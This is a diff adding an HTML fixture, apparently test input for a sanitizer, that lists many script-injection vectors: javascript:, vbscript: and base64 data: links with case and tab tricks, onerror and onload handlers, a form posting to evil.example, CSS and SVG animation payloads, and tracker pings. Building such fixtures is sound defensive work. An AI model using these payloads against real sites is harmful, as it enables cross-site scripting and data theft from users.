@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0; url=https://evil.example/">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Hostile</title>
+<script>window.alert('boom')</script>
+<script src="/tracker.js" async></script>
+<script type="application/ld+json">{"@type":"WebSite"}</script>
+<link rel="dns-prefetch" href="//tracker.example">
+<link rel="modulepreload" href="/app.mjs">
+<link rel="stylesheet" href="/theme.css">
+</head>
+<body onload="steal()" data-vm-id="vm-999" data-vm-note="not ours">
+<h1 onmouseover="track()">Hostile page</h1>
+<a href="javascript:alert('xss')" onclick="alert(1)">plain</a>
+<a href="JaVaScRiPt:alert(2)">mixed case</a>
+<a href="java&#9;script:alert(3)">tab escaped</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">data document</a>
+<a href="vbscript:msgbox(1)">vbscript</a>
+<a href="/ok" data-vm-id="vm-1">fine</a>
+<img src="x.png" onerror="alert(4)" alt="broken">
+<iframe src="https://evil.example/frame" title="ad"></iframe>
+<object data="/flash.swf" type="application/x-shockwave-flash"></object>
+<embed src="/movie.swf" type="application/x-shockwave-flash">
+<applet code="Bad.class"></applet>
+<noscript><p class="fallback">JavaScript is off</p></noscript>
+<form action="https://evil.example/collect" method="post" target="_top">
+  <input name="q">
+  <button type="submit" formaction="javascript:alert(5)">go</button>
+</form>
+<div style="background: url(javascript:alert(6)); color: red">styled</div>
+<svg width="8" height="8"><use xlink:href="javascript:alert(7)"></use></svg>
+<a href="/ok2" ping="https://tracker.example/click">pinged</a>
+<map name="m"><area shape="rect" coords="0,0,8,8" href="/ok3" ping="https://tracker.example/area"></map>
+<svg id="smil" width="8" height="8">
+<a href="javascript:alert(8)"><rect width="4" height="4"></rect></a>
+<image xlink:href="vbscript:msgbox(2)" width="4" height="4"></image>
+<animate attributeName="xlink:href" to="https://evil.example/x" dur="1s"></animate>
+<set attributeName="href" to="/looks-harmless"></set>
+<animateMotion values="#a;javascript:alert(9)" dur="1s"></animateMotion>
+<animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"></animateTransform>
+</svg>
+<!-- a comment that mentions </body> and </head> -->
+<br><wbr>
+<p>done</p>
+</body>
+</html>
